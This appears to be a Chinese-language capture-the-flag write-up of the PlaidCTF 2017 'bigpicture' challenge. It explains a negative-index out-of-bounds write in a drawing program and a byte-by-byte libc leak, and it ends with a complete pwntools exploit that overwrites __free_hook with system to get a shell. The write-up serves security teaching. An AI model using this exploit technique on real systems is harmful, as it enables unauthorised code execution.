---
title: plaidctf 2017 bigpicture
date: 2018-10-03 00:00:00
categories:
- Pwn
tags: Pwn
---

## BIG PICTURE

就是个画图的程序，输入大小，在指定的坐标画一个像素点（字符）

漏洞点在plot函数 ：

```c
int __fastcall plot(int x, int y, char c)
{
  char *v3; // rax
  char v4; // bl

  if ( width > x && height > y )                // -?
  {
    v4 = c;
    v3 = get(x, y);
    if ( *v3 )
      LODWORD(v3) = _printf_chk(1LL, "overwriting %c!\n", (unsigned int)*v3);
    else
      *v3 = v4;
  }
  else
  {
    LODWORD(v3) = puts("out of bounds!");
  }
  return (signed int)v3;
}
```

坐标可以是负数

所以就可以达到一个有限制条件的任意地址写

问题是往哪里写

刚开始的思路是往代码段里面写shellcode。。。我他妈真是疯了

后来才反应过来如果输入的矩阵大小很大的时候就会调用mmap，分配到一个离libc很近的堆地址
```
    0x555555554000     0x555555555000 r-xp     1000 0      /pwn/train/bigpicture
    0x555555755000     0x555555756000 r--p     1000 1000   /pwn/train/bigpicture
    0x555555756000     0x555555757000 rw-p     1000 2000   /pwn/train/bigpicture
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7edc000     0x7ffff7fe0000 rw-p   104000 0    <<---our mmaped heap addres
    0x7ffff7ff8000     0x7ffff7ffa000 r--p     2000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
```
然后libc里边的函数偏移和我们申请的堆地址偏移固定，算出来固定的偏移，一个字节一个字节的写进去就好了

### leak地址

```c
if ( *v3 )
  LODWORD(v3) = _printf_chk(1LL, "overwriting %c!\n", (unsigned int)*v3);
```
如果地址里面有数据就会一个字节一个字节打印出来

首先想到的就是main_arena 里边的unsortedbin附近的存储的libc地址

### getshell

开了fullrelro，只能写hook了

直接写freehook，改成system，之后把堆里面的数据写上/bin/sh，ez

exp：

```python
from pwn import *

# context.log_level = 'debug'

def p():
	gdb.attach(io)
	raw_input()
io = process('./bigpicture')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
leak_offset = 0x12f498
free_hook_offset = 0x12d868

io.recvuntil('?')
io.sendline('1024x1024')
leak = ''
for i in range(6):
	io.recvuntil('>')
	payload = '0,-' + str(leak_offset - i) + ',A'
	io.sendline(payload)
	io.recvuntil('overwriting ')
	leak += io.recv(1)

leak = u64(leak.ljust(8,'\x00'))
libc_base = leak - 0x10 -0x58 - libc.symbols['__malloc_hook']
sys = libc_base + libc.symbols['system']

for i,byte in enumerate(p64(sys)[:6]):
    io.recvuntil('>')
    io.sendline('0,-' + str(free_hook_offset - i) + ',' + byte)

for i,byte in enumerate('/bin/sh'):
	io.recvuntil('>')
	io.sendline('0,'+str(i)+',' + byte)

io.recvuntil('>')
io.sendline('quit')
io.interactive()
```


